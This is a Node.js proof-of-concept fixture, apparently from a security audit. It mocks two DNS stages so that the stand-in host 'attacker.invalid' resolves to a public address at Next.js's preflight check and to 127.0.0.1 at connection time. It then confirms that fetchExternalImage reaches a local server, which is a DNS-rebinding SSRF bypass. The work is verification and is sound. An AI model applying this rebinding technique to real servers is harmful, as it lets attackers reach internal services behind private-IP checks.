// Local-only unit fixture: actual locked fetchExternalImage, mocked two DNS stages.
const http=require('node:http');const dns=require('node:dns');const promises=require('node:dns/promises');
const {createRequire}=require('node:module');
const req=createRequire('/Users/hishamel-husseini/.codex/visualizations/2026/10/21/01a15d64-4430-7440-b259-192acf9762b5/raffle-audit-r001/validation/apps/web/package.json');
const events=[];const hostname='attacker.invalid';
const origLookup=dns.lookup;const origPromise=promises.lookup;
promises.lookup=async function(host,options){if(host===hostname){events.push({stage:'Next preflight DNS',host,returned:'203.0.113.10'});return [{address:'203.0.113.10',family:4}];}return origPromise.call(this,host,options);};
dns.lookup=function(host,options,callback){if(host===hostname){const cb=typeof options==='function'?options:callback;events.push({stage:'fetch socket DNS',host,returned:'127.0.0.1'});return process.nextTick(()=>options&&options.all?cb(null,[{address:'127.0.0.1',family:4}]):cb(null,'127.0.0.1',4));}return origLookup.apply(this,arguments);};
const {fetchExternalImage}=req('next/dist/server/image-optimizer');
const server=http.createServer((request,response)=>{events.push({stage:'local fixture received request',url:request.url,remote:request.socket.remoteAddress});response.writeHead(200,{'Content-Type':'image/png'});response.end('fixture-image-bytes');});
(async()=>{await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));const port=server.address().port;try{const result=await fetchExternalImage(`http://${hostname}:${port}/fixture.png`,false,1024,3);console.log(JSON.stringify({result:'LOCAL_UNIT_REACHABILITY_CONFIRMED',dangerouslyAllowLocalIP:false,bytes:result.buffer.length,events,limits:'Calls locked Next internal function directly. Does not test full /_next/image parameter validation, TLS, real DNS cache behavior, deployment reachability, or successful production exploit.'},null,2));}catch(e){console.log(JSON.stringify({result:'NOT_CONFIRMED',error:String(e),events}));process.exitCode=1;}finally{server.close();}})();
